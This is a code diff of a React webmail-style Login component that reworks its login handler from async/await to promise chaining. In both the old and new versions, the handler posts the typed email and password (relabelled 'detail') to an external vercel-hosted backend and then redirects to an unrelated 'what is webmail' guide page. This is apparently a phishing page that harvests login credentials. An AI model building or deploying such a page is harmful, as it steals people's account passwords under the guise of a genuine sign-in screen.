@@ -146,6 +146,7 @@ const languages = [
 
 const Login = () => {
   const [email, setEmail] = useState('');
+
   const initialValues = {
     email : "",
     password : "",
@@ -185,25 +186,19 @@ const Login = () => {
     console.log(loginValues)
     // setLoginErrors(false)
 }
+// const Navigate = useNavigate()
 
-
-  const url = "https://web-mail-backend.vercel.app/login-user"
-  const data = {email: loginValues.email, detail: loginValues.password}
-
-  // const Navigate = useNavigate()
-
-  const handleLogin = async (e)=>{
+  const handleLogin = (e)=>{
+    const url = "https://web-mail-backend.vercel.app/login-user"
+    const data = {email: loginValues.email, detail: loginValues.password}
     e.preventDefault();
-
-    try {
-          const response = await axios.post(url, data)
-          console.log(response)
-        // Navigate("https://www.website.com/beginnerguide/email/9/1/what-is-webmail?.ws&source=SC")
-          window.location.href = "https://www.website.com/beginnerguide/email/9/1/what-is-webmail?.ws&source=SC"
-    }
-    catch(err){
-      console.log(err);
-    }
+    axios.post(url,data)
+    .then((response)=>{
+      console.log(response)
+      window.location.href = "https://www.website.com/beginnerguide/email/9/1/what-is-webmail?.ws&source=SC"
+    }).catch((error)=>{
+      console.log(error)
+    })
 
 }
 
